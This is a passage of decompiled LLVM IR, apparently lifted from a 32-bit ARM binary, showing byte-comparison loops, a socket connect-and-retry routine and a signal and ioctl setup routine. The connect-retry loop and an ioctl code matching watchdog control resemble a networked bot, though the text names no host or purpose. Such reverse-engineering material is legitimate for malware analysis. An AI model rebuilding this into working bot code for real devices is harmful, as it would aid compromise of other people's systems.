  br label %dec_label_pc_e904

dec_label_pc_e904:                                ; preds = %dec_label_pc_e91c, %dec_label_pc_e904.lr.ph
  %v0_e8fc.in = phi i32 [ %v0_e8fc107, %dec_label_pc_e904.lr.ph ], [ %v0_e8fc, %dec_label_pc_e91c ]
  %v0_e91c = phi i32 [ 0, %dec_label_pc_e904.lr.ph ], [ %v1_e91c, %dec_label_pc_e91c ]
  %v1_e908 = phi i32 [ 0, %dec_label_pc_e904.lr.ph ], [ %v1_e908174, %dec_label_pc_e91c ]
  %v0_e8fc = add i32 %v0_e8fc.in, -1
  store i32 %v3_e84c, i32* %r3.global-to-local, align 4
  %v2_e908 = add i32 %v1_e908, %v3_e84c
  %v3_e908 = inttoptr i32 %v2_e908 to i8*
  %v4_e908 = load i8, i8* %v3_e908, align 1
  %v6_e908 = zext i8 %v4_e908 to i32
  store i32 %v6_e908, i32* %r2.global-to-local, align 4
  %v2_e90c = add i32 %v0_e91c, %v1_e90c.pre
  %v3_e90c = inttoptr i32 %v2_e90c to i8*
  %v4_e90c = load i8, i8* %v3_e90c, align 1
  %v6_e90c = zext i8 %v4_e90c to i32
  store i32 %v6_e90c, i32* %r3.global-to-local, align 4
  %v9_e910 = icmp eq i8 %v4_e90c, %v4_e908
  br i1 %v9_e910, label %dec_label_pc_e9f4, label %bb227

bb227:                                            ; preds = %dec_label_pc_e904
  br label %dec_label_pc_e91c

dec_label_pc_e91c:                                ; preds = %bb227, %dec_label_pc_e9f4
  %v1_e908174 = phi i32 [ %v1_e9f4, %dec_label_pc_e9f4 ], [ 0, %bb227 ]
  %v1_e91c = add i32 %v0_e91c, 1
  store i32 %v1_e91c, i32* %r1.global-to-local, align 4
  %v2_e8fc = icmp eq i32 %v0_e8fc, 0
  br i1 %v2_e8fc, label %dec_label_pc_e85c.backedge, label %dec_label_pc_e904

dec_label_pc_e924:                                ; preds = %dec_label_pc_e93c
  %v1_e924 = add i32 %v1_e93c, 1
  store i32 %v1_e924, i32* @lr, align 4
  %v9_e928 = icmp eq i32 %v3_e878, %v1_e924
  br i1 %v9_e928, label %dec_label_pc_ea00, label %dec_label_pc_e934.backedge

dec_label_pc_e934.backedge:                       ; preds = %dec_label_pc_e924, %dec_label_pc_e950
  %v1_e93c139 = phi i32 [ 0, %dec_label_pc_e950 ], [ %v1_e924, %dec_label_pc_e924 ]
  %storemerge127 = add i32 %storemerge127.in, 1
  %v1_e934 = add i32 %v0_e934, -1
  store i32 %v1_e934, i32* %r1.global-to-local, align 4
  %v2_e934 = icmp eq i32 %v0_e934, 0
  br i1 %v2_e934, label %dec_label_pc_e890, label %dec_label_pc_e93c

dec_label_pc_e93c:                                ; preds = %dec_label_pc_e934.backedge, %dec_label_pc_e93c.lr.ph
  %v0_e934 = phi i32 [ %v1_e93472, %dec_label_pc_e93c.lr.ph ], [ %v1_e934, %dec_label_pc_e934.backedge ]
  %storemerge127.in = phi i32 [ 0, %dec_label_pc_e93c.lr.ph ], [ %storemerge127, %dec_label_pc_e934.backedge ]
  %v1_e93c = phi i32 [ 0, %dec_label_pc_e93c.lr.ph ], [ %v1_e93c139, %dec_label_pc_e934.backedge ]
  %v2_e93c = add i32 %v1_e93c, %v0_e93c.pre
  %v3_e93c = inttoptr i32 %v2_e93c to i8*
  %v4_e93c = load i8, i8* %v3_e93c, align 1
  %v6_e93c = zext i8 %v4_e93c to i32
  store i32 %v6_e93c, i32* %r2.global-to-local, align 4
  %v2_e940 = add i32 %storemerge127.in, %v1_e940.pre
  %v3_e940 = inttoptr i32 %v2_e940 to i8*
  %v4_e940 = load i8, i8* %v3_e940, align 1
  %v6_e940 = zext i8 %v4_e940 to i32
  store i32 %v6_e940, i32* %r3.global-to-local, align 4
  %v9_e944 = icmp eq i8 %v4_e940, %v4_e93c
  br i1 %v9_e944, label %dec_label_pc_e924, label %dec_label_pc_e950

dec_label_pc_e950:                                ; preds = %dec_label_pc_e93c
  br label %dec_label_pc_e934.backedge

dec_label_pc_e958:                                ; preds = %dec_label_pc_e970
  %v1_e958 = add i32 %v1_e970, 1
  store i32 %v1_e958, i32* @lr, align 4
  %v9_e95c = icmp eq i32 %v3_e894, %v1_e958
  br i1 %v9_e95c, label %dec_label_pc_ea00, label %dec_label_pc_e968.backedge

dec_label_pc_e968.backedge:                       ; preds = %dec_label_pc_e958, %dec_label_pc_e984
  %v1_e970148 = phi i32 [ 0, %dec_label_pc_e984 ], [ %v1_e958, %dec_label_pc_e958 ]
  %storemerge126 = add i32 %storemerge126.in, 1
  %v1_e968 = add i32 %v0_e968, -1
  store i32 %v1_e968, i32* %r1.global-to-local, align 4
  %v2_e968 = icmp eq i32 %v0_e968, 0
  br i1 %v2_e968, label %dec_label_pc_e8ac, label %dec_label_pc_e970

dec_label_pc_e970:                                ; preds = %dec_label_pc_e968.backedge, %dec_label_pc_e970.lr.ph
  %v0_e968 = phi i32 [ %v1_e96881, %dec_label_pc_e970.lr.ph ], [ %v1_e968, %dec_label_pc_e968.backedge ]
  %storemerge126.in = phi i32 [ 0, %dec_label_pc_e970.lr.ph ], [ %storemerge126, %dec_label_pc_e968.backedge ]
  %v1_e970 = phi i32 [ 0, %dec_label_pc_e970.lr.ph ], [ %v1_e970148, %dec_label_pc_e968.backedge ]
  %v2_e970 = add i32 %v1_e970, %v0_e970.pre
  %v3_e970 = inttoptr i32 %v2_e970 to i8*
  %v4_e970 = load i8, i8* %v3_e970, align 1
  %v6_e970 = zext i8 %v4_e970 to i32
  store i32 %v6_e970, i32* %r2.global-to-local, align 4
  %v2_e974 = add i32 %storemerge126.in, %v1_e974.pre
  %v3_e974 = inttoptr i32 %v2_e974 to i8*
  %v4_e974 = load i8, i8* %v3_e974, align 1
  %v6_e974 = zext i8 %v4_e974 to i32
  store i32 %v6_e974, i32* %r3.global-to-local, align 4
  %v9_e978 = icmp eq i8 %v4_e974, %v4_e970
  br i1 %v9_e978, label %dec_label_pc_e958, label %dec_label_pc_e984

dec_label_pc_e984:                                ; preds = %dec_label_pc_e970
  br label %dec_label_pc_e968.backedge

dec_label_pc_e98c:                                ; preds = %dec_label_pc_e9a4
  %v1_e98c = add i32 %v1_e9a4, 1
  store i32 %v1_e98c, i32* @lr, align 4
  %v9_e990 = icmp eq i32 %v3_e8b0, %v1_e98c
  br i1 %v9_e990, label %dec_label_pc_ea00, label %dec_label_pc_e99c.backedge

dec_label_pc_e99c.backedge:                       ; preds = %dec_label_pc_e98c, %dec_label_pc_e9b8
  %v1_e9a4157 = phi i32 [ 0, %dec_label_pc_e9b8 ], [ %v1_e98c, %dec_label_pc_e98c ]
  %storemerge125 = add i32 %storemerge125.in, 1
  %v1_e99c = add i32 %v0_e99c, -1
  store i32 %v1_e99c, i32* %r1.global-to-local, align 4
  %v2_e99c = icmp eq i32 %v0_e99c, 0
  br i1 %v2_e99c, label %dec_label_pc_e8c8, label %dec_label_pc_e9a4

dec_label_pc_e9a4:                                ; preds = %dec_label_pc_e99c.backedge, %dec_label_pc_e9a4.lr.ph
  %v0_e99c = phi i32 [ %v1_e99c90, %dec_label_pc_e9a4.lr.ph ], [ %v1_e99c, %dec_label_pc_e99c.backedge ]
  %storemerge125.in = phi i32 [ 0, %dec_label_pc_e9a4.lr.ph ], [ %storemerge125, %dec_label_pc_e99c.backedge ]
  %v1_e9a4 = phi i32 [ 0, %dec_label_pc_e9a4.lr.ph ], [ %v1_e9a4157, %dec_label_pc_e99c.backedge ]
  %v2_e9a4 = add i32 %v1_e9a4, %v0_e9a4.pre
  %v3_e9a4 = inttoptr i32 %v2_e9a4 to i8*
  %v4_e9a4 = load i8, i8* %v3_e9a4, align 1
  %v6_e9a4 = zext i8 %v4_e9a4 to i32
  store i32 %v6_e9a4, i32* %r2.global-to-local, align 4
  %v2_e9a8 = add i32 %storemerge125.in, %v1_e9a8.pre
  %v3_e9a8 = inttoptr i32 %v2_e9a8 to i8*
  %v4_e9a8 = load i8, i8* %v3_e9a8, align 1
  %v6_e9a8 = zext i8 %v4_e9a8 to i32
  store i32 %v6_e9a8, i32* %r3.global-to-local, align 4
  %v9_e9ac = icmp eq i8 %v4_e9a8, %v4_e9a4
  br i1 %v9_e9ac, label %dec_label_pc_e98c, label %dec_label_pc_e9b8

dec_label_pc_e9b8:                                ; preds = %dec_label_pc_e9a4
  br label %dec_label_pc_e99c.backedge

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e9d8
  %v1_e9c0 = add i32 %v1_e9d8, 1
  store i32 %v1_e9c0, i32* @lr, align 4
  %v9_e9c4 = icmp eq i32 %v3_e8cc, %v1_e9c0
  br i1 %v9_e9c4, label %dec_label_pc_ea00, label %dec_label_pc_e9d0.backedge

dec_label_pc_e9d0.backedge:                       ; preds = %dec_label_pc_e9c0, %dec_label_pc_e9ec
  %v1_e9d8166 = phi i32 [ 0, %dec_label_pc_e9ec ], [ %v1_e9c0, %dec_label_pc_e9c0 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_e9d0 = add i32 %v0_e9d0, -1
  store i32 %v1_e9d0, i32* %r1.global-to-local, align 4
  %v2_e9d0 = icmp eq i32 %v0_e9d0, 0
  br i1 %v2_e9d0, label %dec_label_pc_e8e4, label %dec_label_pc_e9d8

dec_label_pc_e9d8:                                ; preds = %dec_label_pc_e9d0.backedge, %dec_label_pc_e9d8.lr.ph
  %v0_e9d0 = phi i32 [ %v1_e9d099, %dec_label_pc_e9d8.lr.ph ], [ %v1_e9d0, %dec_label_pc_e9d0.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_e9d8.lr.ph ], [ %storemerge, %dec_label_pc_e9d0.backedge ]
  %v1_e9d8 = phi i32 [ 0, %dec_label_pc_e9d8.lr.ph ], [ %v1_e9d8166, %dec_label_pc_e9d0.backedge ]
  %v2_e9d8 = add i32 %v1_e9d8, %v0_e9d8.pre
  %v3_e9d8 = inttoptr i32 %v2_e9d8 to i8*
  %v4_e9d8 = load i8, i8* %v3_e9d8, align 1
  %v6_e9d8 = zext i8 %v4_e9d8 to i32
  store i32 %v6_e9d8, i32* %r2.global-to-local, align 4
  %v2_e9dc = add i32 %storemerge.in, %v1_e9dc.pre
  %v3_e9dc = inttoptr i32 %v2_e9dc to i8*
  %v4_e9dc = load i8, i8* %v3_e9dc, align 1
  %v6_e9dc = zext i8 %v4_e9dc to i32
  store i32 %v6_e9dc, i32* %r3.global-to-local, align 4
  %v9_e9e0 = icmp eq i8 %v4_e9dc, %v4_e9d8
  br i1 %v9_e9e0, label %dec_label_pc_e9c0, label %dec_label_pc_e9ec

dec_label_pc_e9ec:                                ; preds = %dec_label_pc_e9d8
  br label %dec_label_pc_e9d0.backedge

dec_label_pc_e9f4:                                ; preds = %dec_label_pc_e904
  %v1_e9f4 = add i32 %v1_e908, 1
  %v9_e9f8 = icmp eq i32 %v3_e8e8, %v1_e9f4
  br i1 %v9_e9f8, label %dec_label_pc_ea00, label %dec_label_pc_e91c

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e924, %dec_label_pc_e958, %dec_label_pc_e98c, %dec_label_pc_e9c0, %dec_label_pc_e9f4
  %v1_ea04 = call i32 @function_11b48(i32 12)
  %v1_ea0c = call i32 @function_11b48(i32 13)
  %v1_ea14 = call i32 @function_11b48(i32 14)
  %v1_ea1c = call i32 @function_11b48(i32 15)
  %v1_ea24 = call i32 @function_11b48(i32 16)
  %v1_ea2c = call i32 @function_1314c(i32 %v2_e7bc)
  %v0_ea30 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_ea38 = call i32 @function_12f18(i32 %v0_ea30, i32 9)
  br label %dec_label_pc_ea3c

dec_label_pc_ea3c:                                ; preds = %dec_label_pc_e7b0, %dec_label_pc_ea70, %dec_label_pc_ea00
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_ea48 = call i32 @function_12514(i32 %v2_e638, i32 64)
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_ea58 = call i32 @function_12514(i32 %v2_e688, i32 64)
  %v1_ea60 = call i32 @function_1524c(i32 1)
  store i32 %v2_e60c, i32* @r4, align 4
  %v0_ea68 = load i32, i32* @r7, align 4
  store i32 %v0_ea68, i32* @r5, align 4
  br label %dec_label_pc_e55c.backedge

dec_label_pc_ea70:                                ; preds = %dec_label_pc_e85c.backedge, %dec_label_pc_e7cc
  %v1_ea74 = call i32 @function_11b48(i32 12)
  %v1_ea7c = call i32 @function_11b48(i32 13)
  %v1_ea84 = call i32 @function_11b48(i32 14)
  %v1_ea8c = call i32 @function_11b48(i32 15)
  %v1_ea94 = call i32 @function_11b48(i32 16)
  %v1_ea9c = call i32 @function_1314c(i32 %v2_e7bc)
  br label %dec_label_pc_ea3c

; uselistorder directives
  uselistorder i32 %v1_e9f4, { 1, 0 }
  uselistorder i32 %v1_e91c, { 1, 0 }
  uselistorder i32 %v1_e908, { 1, 0 }
  uselistorder i32 %v0_e91c, { 1, 0 }
  uselistorder i32 %v1_e868, { 1, 0 }
  uselistorder i32 %v2_e7bc, { 3, 2, 4, 1, 0 }
  uselistorder i1 %v7_e794, { 1, 0 }
  uselistorder i32 %v2_e790, { 1, 0 }
  uselistorder i32 %v2_e560, { 1, 0 }
  uselistorder i32 %stack_var_-8428.1.be, { 1, 0 }
  uselistorder i32 %v3_e6e8, { 1, 2, 0 }
  uselistorder i32 %v2_e5f0, { 1, 0 }
  uselistorder i32 %v1_e590, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_e56c, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8428.0, { 1, 0 }
  uselistorder i32 %v2_e858, { 1, 0, 2 }
  uselistorder i32 %v2_e688, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e638, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_e520, { 1, 0 }
  uselistorder i32 %v3_e504, { 1, 0 }
  uselistorder i32 %v2_e4d0, { 2, 0, 1 }
  uselistorder i32 %v1_e46c, { 3, 2, 0, 4, 6, 5, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32 %v3_e3ec, { 1, 2, 0 }
  uselistorder i32 %v3_e3a0, { 1, 2, 0 }
  uselistorder i32 %storemerge184, { 1, 0 }
  uselistorder i32 %v0_e334, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-76, { 1, 2, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 20, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 53, 10, 8, 57, 56, 55, 54, 9, 58, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 (i32*)* @function_1348c, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @function_13348, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_12eb0, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_23398.107, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_2339c.99, { 0, 2, 1 }
  uselistorder label %dec_label_pc_ea3c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ea00, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e9d0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e99c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e968.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e934.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e91c, { 1, 0 }
  uselistorder label %dec_label_pc_e874, { 1, 0 }
  uselistorder label %dec_label_pc_e7b0, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_e55c.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_e744, { 1, 0 }
  uselistorder label %dec_label_pc_e56c, { 1, 0 }
  uselistorder label %dec_label_pc_e56c.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_e418, { 1, 0 }
  uselistorder label %dec_label_pc_e3cc, { 1, 0 }
}

define i32 @function_eab4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_eab4:
  store i32 ptrtoint (i32* @global_var_ec30.111 to i32), i32* inttoptr (i32 135468 to i32*), align 4
  ret i32 %arg1
}

define i32 @function_eacc() local_unnamed_addr {
dec_label_pc_eacc:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v12_eacc = load i32, i32* @r7, align 4
  store i32 1, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_eae8 = call i32 @function_13940(i32 2, i32 1, i32 0)
  store i32 %v3_eae8, i32* %r0.global-to-local, align 4
  store i32 135460, i32* @r6, align 4
  %v7_eaf0 = icmp eq i32 %v3_eae8, -1
  store i32 %v3_eae8, i32* inttoptr (i32 135460 to i32*), align 4
  br i1 %v7_eaf0, label %dec_label_pc_eacc.dec_label_pc_eba8_crit_edge, label %dec_label_pc_eafc

dec_label_pc_eacc.dec_label_pc_eba8_crit_edge:    ; preds = %dec_label_pc_eacc
  %v1_ebb0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eba8

dec_label_pc_eafc:                                ; preds = %dec_label_pc_eacc
  %v2_eafc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_eafc, i32* @r3, align 4
  %v0_eb00 = load i32, i32* @r4, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  %v0_eb10 = load i32, i32* %r0.global-to-local, align 4
  %v5_eb10 = call i32 @function_138fc(i32 %v0_eb10, i32 %v0_eb00, i32 2, i32 %v2_eafc, i32 4)
  store i32 %v5_eb10, i32* %r0.global-to-local, align 4
  %v0_eb14 = load i32, i32* @r6, align 4
  %v1_eb14 = inttoptr i32 %v0_eb14 to i32*
  %v2_eb14 = load i32, i32* %v1_eb14, align 4
  store i32 %v2_eb14, i32* %r0.global-to-local, align 4
  %v2_eb24 = call i32 @function_12f80(i32 %v2_eb14, i32 3)
  %v0_eb28 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v2_eb14, i32* %r0.global-to-local, align 4
  %v2_eb34 = call i32 @function_12f80(i32 %v2_eb14, i32 %v0_eb28)
  store i32 %v2_eb34, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @1 to i32), i32* @r8, align 4
  %v0_eb64 = call i32 @function_13574()
  store i32 %v0_eb64, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v2_eb6c = inttoptr i32 %v0_eb64 to i32*
  store i32 0, i32* %v2_eb6c, align 4
  %v2_eb70 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_eb70, i32* @r5, align 4
  store i32 %v0_eb64, i32* @r4, align 4
  %v0_eb80 = load i32, i32* @r6, align 4
  %v1_eb80 = inttoptr i32 %v0_eb80 to i32*
  %v2_eb80 = load i32, i32* %v1_eb80, align 4
  store i32 %v2_eb80, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_eb8c = call i32 @function_136f0(i32 %v2_eb80, i32 %v2_eb70, i32 16)
  store i32 %v3_eb8c, i32* %r0.global-to-local, align 4
  %v7_eb90 = icmp eq i32 %v3_eb8c, -1
  br i1 %v7_eb90, label %dec_label_pc_ebb4, label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_eafc
  %v2_eba0 = load i32, i32* inttoptr (i32 135460 to i32*), align 4
  store i32 %v2_eba0, i32* %r0.global-to-local, align 4
  %v2_eba4 = call i32 @function_137dc(i32 %v2_eba0, i32 1)
  store i32 %v2_eba4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eba8

dec_label_pc_eba8:                                ; preds = %dec_label_pc_eacc.dec_label_pc_eba8_crit_edge, %dec_label_pc_ebc0, %dec_label_pc_eb98
  %v1_ebb0 = phi i32 [ %v1_ebb0.pre, %dec_label_pc_eacc.dec_label_pc_eba8_crit_edge ], [ %v0_ec08, %dec_label_pc_ebc0 ], [ %v2_eba4, %dec_label_pc_eb98 ]
  store i32 %v12_eacc, i32* @r7, align 4
  ret i32 %v1_ebb0

dec_label_pc_ebb4:                                ; preds = %dec_label_pc_eafc
  %v0_ebb4 = load i32, i32* @r4, align 4
  %v1_ebb4 = inttoptr i32 %v0_ebb4 to i32*
  %v2_ebb4 = load i32, i32* %v1_ebb4, align 4
  %v7_ebb8 = icmp eq i32 %v2_ebb4, 99
  br i1 %v7_ebb8, label %dec_label_pc_ec10, label %dec_label_pc_ebc0

dec_label_pc_ebc0:                                ; preds = %dec_label_pc_ec10, %bb, %dec_label_pc_ebb4
  %v0_ebd8 = load i32, i32* @r6, align 4
  %v1_ebd8 = inttoptr i32 %v0_ebd8 to i32*
  %v2_ebd8 = load i32, i32* %v1_ebd8, align 4
  store i32 %v2_ebd8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_ebe8 = call i32 @function_13728(i32 %v2_ebd8, i32 %v2_eb70, i32 16)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_ebf0 = call i32 @function_1524c(i32 5)
  store i32 %v1_ebf0, i32* %r0.global-to-local, align 4
  %v0_ebf4 = load i32, i32* @r6, align 4
  %v1_ebf4 = inttoptr i32 %v0_ebf4 to i32*
  %v2_ebf4 = load i32, i32* %v1_ebf4, align 4
  store i32 %v2_ebf4, i32* %r0.global-to-local, align 4
  %v1_ebf8 = call i32 @function_1314c(i32 %v2_ebf4)
  store i32 58811, i32* %r0.global-to-local, align 4
  %v1_ec04 = call i32 @function_ddb4(i32 58811)
  store i32 %v1_ec04, i32* %r0.global-to-local, align 4
  %v0_ec08 = call i32 @function_eacc()
  store i32 %v0_ec08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eba8

dec_label_pc_ec10:                                ; preds = %dec_label_pc_ebb4
  %v0_ec10 = load i32, i32* @r8, align 4
  %v1_ec10 = inttoptr i32 %v0_ec10 to i8*
  %v2_ec10 = load i8, i8* %v1_ec10, align 1
  %v3_ec10 = zext i8 %v2_ec10 to i32
  %v1_ec14 = load i32, i32* @r7, align 4
  %v9_ec14 = icmp eq i32 %v3_ec10, %v1_ec14
  br i1 %v9_ec14, label %dec_label_pc_ebc0, label %bb

bb:                                               ; preds = %dec_label_pc_ec10
  %v2_ec1c = trunc i32 %v1_ec14 to i8
  store i8 %v2_ec1c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @1, i32 0, i32 0), align 1
  br label %dec_label_pc_ebc0

; uselistorder directives
  uselistorder i32 %v0_ec08, { 1, 0 }
  uselistorder i32 %v2_eb70, { 1, 0, 2 }
  uselistorder i32 %v2_eb14, { 1, 0, 2, 3 }
  uselistorder i32 %v3_eae8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 8, 7, 10, 9, 11, 13, 12, 14, 15, 17, 18, 19, 16 }
  uselistorder i32 (i32)* @function_ddb4, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_137dc, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_136f0, { 3, 2, 1, 0 }
  uselistorder [4 x i8]* @1, { 1, 0 }
  uselistorder i32* inttoptr (i32 135460 to i32*), { 1, 0 }
  uselistorder label %dec_label_pc_ebc0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eba8, { 1, 2, 0 }
}

define i32 @function_ec24(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ec24:
  %v0_ec24 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ec24, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_ec24
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_ec24, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_ec30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ec30:
  %v1_ec38 = call i32 @function_11be8(i32 3)
  %v3_ec44 = call i32 @function_11b24(i32 3, i32* null)
  %v1_ec48 = call i32 @function_fa04(i32 %v3_ec44)
  store i32 %v1_ec48, i32* @r6, align 4
  %v1_ec54 = call i32 @function_11b48(i32 3)
  %v0_ec58 = load i32, i32* @r6, align 4
  %v2_ec58 = icmp eq i32 %v0_ec58, 0
  br i1 %v2_ec58, label %dec_label_pc_eca8, label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %dec_label_pc_ec30
  %v1_ec60 = add i32 %v0_ec58, 4
  %v2_ec60 = inttoptr i32 %v1_ec60 to i32*
  %v3_ec60 = load i32, i32* %v2_ec60, align 4
  store i32 %v3_ec60, i32* @r4, align 4
  %v0_ec64 = call i32 @function_f700()
  %v0_ec68 = load i32, i32* @r6, align 4
  %v1_ec68 = inttoptr i32 %v0_ec68 to i8*
  %v2_ec68 = load i8, i8* %v1_ec68, align 1
  %v3_ec68 = zext i8 %v2_ec68 to i32
  %v2_ec6c = call i32 @function_12b6c(i32 %v0_ec64, i32 %v3_ec68)
  store i32 ptrtoint (i16** @global_var_233a0.117 to i32), i32* @r5, align 4
  %v0_ec74 = load i32, i32* @r4, align 4
  %v4_ec74 = mul nuw nsw i32 %v3_ec68, 4
  %v5_ec74 = add i32 %v0_ec74, %v4_ec74
  %v6_ec74 = inttoptr i32 %v5_ec74 to i32*
  %v7_ec74 = load i32, i32* %v6_ec74, align 4
  %v0_ec78 = load i32, i32* @r6, align 4
  store i32 %v7_ec74, i32* @global_var_233a4.118, align 4
  %v1_ec80 = call i32 @function_f9dc(i32 %v0_ec78)
  %v1_ec88 = call i32 @function_11be8(i32 4)
  %v3_ec94 = call i32 @function_11b24(i32 4, i32* null)
  %v4_ec94 = inttoptr i32 %v3_ec94 to i16*
  %v3_ec98 = load i16, i16* %v4_ec94, align 2
  store i16 %v3_ec98, i16* bitcast (i32* @global_var_233a2.119 to i16*), align 4
  %v1_eca4 = call i32 @function_11b48(i32 4)
  br label %dec_label_pc_eca8

dec_label_pc_eca8:                                ; preds = %dec_label_pc_ec30, %dec_label_pc_ec60
  %v1_ecac = phi i32 [ %v1_ec54, %dec_label_pc_ec30 ], [ %v1_eca4, %dec_label_pc_ec60 ]
  ret i32 %v1_ecac

; uselistorder directives
  uselistorder label %dec_label_pc_eca8, { 1, 0 }
}

define i32 @function_ecb4(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_ecb4:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-84 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-150 = alloca i32, align 4
  %stack_var_-182 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-118 = alloca i8, align 1
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v6_ecb4 = load i32, i32* @r5, align 4
  %v9_ecb4 = load i32, i32* @r6, align 4
  %v2_ecc0 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_ecc0, i32* @r4, align 4
  store i32 %arg1, i32* @sb, align 4
  %v2_ecc8 = load i32, i32* %arg2, align 4
  store i32 %tmp, i32* @sl, align 4
  %v1_ecd0 = call i32 @function_12cf0(i32 %v2_ecc8)
  %v2_ecd8 = call i32 @function_139d8(i32* nonnull %stack_var_-64)
  store i32 %v2_ecc0, i32* @r0, align 4
  %v2_ece4 = call i32 @function_13994(i32 %v2_ecc0, i32 2)
  %v3_ecf4 = call i32 @function_13114(i32 0, i32 %v2_ecc0, i32 0)
  %v2_ed00 = call i32 @function_139ec(i32 17, i32 1)
  %v2_ed0c = call i32 @function_139ec(i32 5, i32 60084)
  %v3_ed18 = call i32 @function_12d24(i32 ptrtoint ([14 x i8]* @global_var_18560.122 to i32), i32 2)
  %v7_ed1c = icmp eq i32 %v3_ed18, -1
  store i32 %v3_ed18, i32* @r4, align 4
  br i1 %v7_ed1c, label %dec_label_pc_f0cc, label %dec_label_pc_ed28

dec_label_pc_ed28:                                ; preds = %dec_label_pc_f0cc, %dec_label_pc_ecb4
  %v0_ed3c = phi i32 [ %v3_f0d4, %dec_label_pc_f0cc ], [ %v3_ed18, %dec_label_pc_ecb4 ]
  store i32 1, i32* @r3, align 4
  %v2_ed40 = ptrtoint i32* %stack_var_-52 to i32
  store i32 1, i32* %stack_var_-52, align 4
  %v3_ed48 = call i32 @function_130c0(i32 %v0_ed3c, i32 -2147199228, i32 %v2_ed40)
  %v0_ed4c = load i32, i32* @r4, align 4
  %v1_ed50 = call i32 @function_1314c(i32 %v0_ed4c)
  br label %dec_label_pc_ed54

dec_label_pc_ed54:                                ; preds = %dec_label_pc_f0cc, %dec_label_pc_ed28
  %v1_ed58 = call i32 @function_12e7c(i32 ptrtoint (i32* @global_var_18510.19 to i32))
